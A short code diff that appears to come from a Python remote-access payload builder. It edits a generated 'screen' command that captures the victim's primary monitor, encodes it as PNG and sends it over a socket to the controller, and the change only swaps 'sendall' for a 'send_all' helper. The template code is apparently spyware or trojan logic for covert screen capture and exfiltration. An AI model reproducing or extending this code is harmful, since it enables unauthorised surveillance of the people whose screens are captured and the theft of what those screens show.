@@ -13,7 +13,7 @@ def screen():
         monitor = sct.monitors[1]
         im = sct.grab(monitor)
         raw_bytes = mss.tools.to_png(im.rgb, im.size)
-        s.sendall(raw_bytes)''')
+        send_all(s,raw_bytes)''')
         config.logics.append('''
             elif command == "screen":
                 screen()''')
